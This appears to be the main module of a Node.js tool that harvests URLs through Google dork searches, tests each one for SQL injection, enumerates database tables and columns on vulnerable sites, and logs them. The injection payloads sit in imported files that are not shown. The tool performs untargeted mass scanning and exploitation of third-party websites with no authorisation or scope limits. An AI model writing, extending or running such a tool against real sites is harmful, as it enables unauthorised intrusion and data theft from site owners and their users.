import { searchGoogle } from './google-search.js';
import { testSQLInjection } from './sql-injection.js';
import { isValidTestUrl } from './url-utils.js';
import { urlStore } from './url-store.js';
import { ResultStorage } from './result-storage.js';
import { DORK_PATTERNS, GOOGLE_SEARCH_DELAY } from './config.js';
import { delay } from './utils.js';

const resultStorage = new ResultStorage();

async function processSingleUrl(url) {
  if (!isValidTestUrl(url) || urlStore.isUrlTested(url)) {
    return;
  }

  console.log(`\n[+] Testing URL: ${url}`);
  
  const result = await testSQLInjection(url);
  if (result.vulnerable) {
    await displayResults(result);
    await resultStorage.saveVulnerableUrl(url, result);
  }
  
  // Wait between tests
  await delay(2000);
}

async function displayResults(result) {
  console.log('\n[!] Vulnerability confirmed!');
  console.log('[+] Found columns:', result.columns);
  
  if (result.tables.size > 0) {
    console.log('[+] Database tables found:');
    for (const table of result.tables) {
      console.log(`  - ${table}`);
    }
  }
  
  if (result.columns.length > 0) {
    console.log('[+] Columns found:');
    for (const column of result.columns) {
      console.log(`  - ${column}`);
    }
  }
}

async function main() {
  console.log('=== SQL Injection Vulnerability Scanner Started ===\n');

  for (const dork of DORK_PATTERNS) {
    console.log(`[*] Searching for: ${dork}`);
    const urls = await searchGoogle(dork);
    
    for (const url of urls) {
      await processSingleUrl(url);
    }
    
    // Wait between Google searches
    console.log(`\n[*] Waiting ${GOOGLE_SEARCH_DELAY/1000} seconds before next search...`);
    await delay(GOOGLE_SEARCH_DELAY);
  }
  
  await displaySummary();
}

async function displaySummary() {
  const stats = urlStore.getStats();
  console.log('\n=== Scan Complete ===');
  console.log(`Total URLs tested: ${stats.totalTested}`);
  console.log(`Vulnerable URLs found: ${stats.totalVulnerable}`);
  await resultStorage.saveScanSummary(stats, urlStore.vulnerableUrls);
}

main().catch(console.error);